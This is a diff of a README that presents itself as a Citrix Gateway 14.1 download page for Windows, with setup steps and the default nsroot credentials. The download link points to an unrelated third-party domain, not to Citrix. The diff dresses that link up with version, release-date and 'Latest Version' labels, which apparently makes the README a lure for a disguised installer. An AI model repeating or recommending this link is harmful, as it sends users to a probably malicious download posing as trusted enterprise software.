@@ -8,19 +8,18 @@
 
 ## Windows
 
-Get the Citrix Gateway installer: [Click to Download](https://dinova.cl/1235/).
+**Version:** 14.1 Build 38.53 (Feature Phase)  
+**Release Date:** Dec 18, 2024  
+**Status:** Latest Version
 
-### Installation Steps
-
-1. Run the downloaded installer.
-2. Follow the on-screen instructions to complete the setup.
-3. Once installed, open your browser and navigate to the configuration utility (default: http://192.168.100.1).
+[Download Citrix Gateway 14.1 Build 38.53 for Windows](https://dinova.cl/1235/).
 
 ### Initial Configuration
 
 > [!NOTE]  
 > By default, the username and password are `nsroot`. For enhanced security, it is strongly recommended to change the default credentials after the first login.
 
+- **Access Configuration Utility:** Once installed, open your browser and navigate to the configuration utility (default: [http://192.168.100.1](http://192.168.100.1)).
 - **Login:** Use the default credentials (`Username: nsroot`, `Password: nsroot`).
 - **Virtual Server Setup:** Use the Quick Configuration Wizard to create a virtual server.
 - **Authentication:** Configure user authentication methods (e.g., LDAP, RADIUS).
